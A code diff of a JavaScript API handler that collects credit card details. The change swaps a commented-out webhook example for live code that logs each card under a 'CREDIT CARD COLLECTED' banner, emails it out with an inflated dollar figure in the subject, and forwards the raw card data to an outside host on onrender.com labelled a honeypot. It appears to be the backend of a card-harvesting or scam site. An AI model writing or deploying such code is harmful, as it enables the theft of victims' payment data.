@@ -41,20 +41,25 @@ export default async function handler(req, res) {
       }
     };
 
-    // Send alert to admin (replace with your preferred method)
+    // Send alert to admin
     console.log('🎯 CREDIT CARD COLLECTED:', cardInfo);
 
-    // You can also send to webhook, email, or database
-    // Example webhook:
-    /*
-    await fetch('YOUR_WEBHOOK_URL', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(cardInfo)
-    });
-    */
+    // Send email alert
+    try {
+      await fetch('/api/send-email-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'CREDIT_CARD',
+          subject: `🎯 CREDIT CARD COLLECTED - $${(parseFloat(amount) * 3200).toFixed(2)}`,
+          data: cardInfo
+        })
+      });
+    } catch (error) {
+      console.log('Email alert failed');
+    }
 
-    // Send to your existing honeypot alert system
+    // Send to honeypot alert system
     try {
       await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
         method: 'POST',
